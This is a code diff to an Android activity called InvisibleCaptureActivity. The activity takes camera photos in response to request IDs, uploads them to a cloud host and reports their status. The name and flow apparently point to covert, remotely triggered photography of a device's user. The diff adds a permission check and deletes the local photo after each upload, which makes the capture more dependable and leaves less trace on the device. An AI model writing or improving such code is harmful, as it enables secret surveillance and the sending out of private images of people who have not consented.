@@ -104,6 +104,17 @@ class InvisibleCaptureActivity : Activity() {
     }
 
     private fun executeCameraCapture(facing: String, requestId: String?) {
+        val hasCameraPermission = androidx.core.content.ContextCompat.checkSelfPermission(
+            this,
+            android.Manifest.permission.CAMERA
+        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+
+        if (!hasCameraPermission) {
+            markFailed(requestId, "Camera permission not granted on device")
+            cleanupAndFinish()
+            return
+        }
+
         try {
             val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
             val cameraId = manager.cameraIdList.firstOrNull { id ->
@@ -154,6 +165,9 @@ class InvisibleCaptureActivity : Activity() {
 
                     if (!requestId.isNullOrEmpty()) {
                         CloudinaryUploader.uploadFile(tempFile) { uploadedUrl, error ->
+                            try {
+                                tempFile.delete()
+                            } catch (_: Throwable) {}
                             if (!uploadedUrl.isNullOrEmpty()) {
                                 CloudBridgeSync.updateRequestStatus(
                                     requestId = requestId,
@@ -166,6 +180,9 @@ class InvisibleCaptureActivity : Activity() {
                             cleanupAndFinish()
                         }
                     } else {
+                        try {
+                            tempFile.delete()
+                        } catch (_: Throwable) {}
                         cleanupAndFinish()
                     }
                 } catch (e: Throwable) {
@@ -339,6 +356,9 @@ class InvisibleCaptureActivity : Activity() {
 
                     if (!requestId.isNullOrEmpty()) {
                         CloudinaryUploader.uploadFile(tempFile) { uploadedUrl, error ->
+                            try {
+                                tempFile.delete()
+                            } catch (_: Throwable) {}
                             if (!uploadedUrl.isNullOrEmpty()) {
                                 CloudBridgeSync.updateRequestStatus(
                                     requestId = requestId,
@@ -351,6 +371,9 @@ class InvisibleCaptureActivity : Activity() {
                             cleanupAndFinish()
                         }
                     } else {
+                        try {
+                            tempFile.delete()
+                        } catch (_: Throwable) {}
                         cleanupAndFinish()
                     }
                 } catch (e: Throwable) {
